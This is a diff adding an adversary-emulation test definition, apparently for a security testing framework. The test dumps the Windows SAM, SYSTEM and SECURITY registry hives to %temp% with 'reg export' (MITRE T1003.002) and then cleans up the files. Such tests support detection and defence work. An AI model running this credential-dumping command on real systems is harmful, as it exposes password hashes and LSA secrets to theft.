@@ -1,0 +1,22 @@
+- description: 'Local SAM (SAM & System), cached credentials (System & Security) and
+    LSA secrets (System & Security) can be enumerated via three registry keys. Used
+    reg export to execute this behavior
+
+    Upon successful execution of this test, you will find three files named, sam,
+    system and security in the %temp% directory.
+
+    '
+  id: 7a6f458c-dff6-4fdd-8ec0-c2917400dd90
+  name: Dumping of SAM, creds, and secrets(Reg Export)
+  platforms:
+    windows:
+      cmd:
+        cleanup: del %temp%\sam >nul 2> nul && del %temp%\system >nul 2> nul && del
+          %temp%\security >nul 2> nul
+        command: reg export HKLM\sam %temp%\sam && reg export HKLM\system %temp%\system
+          && reg export HKLM\security %temp%\security
+        payloads: []
+  tactic: credential-access
+  technique:
+    attack_id: T1003.002
+    name: 'OS Credential Dumping: Security Account Manager'
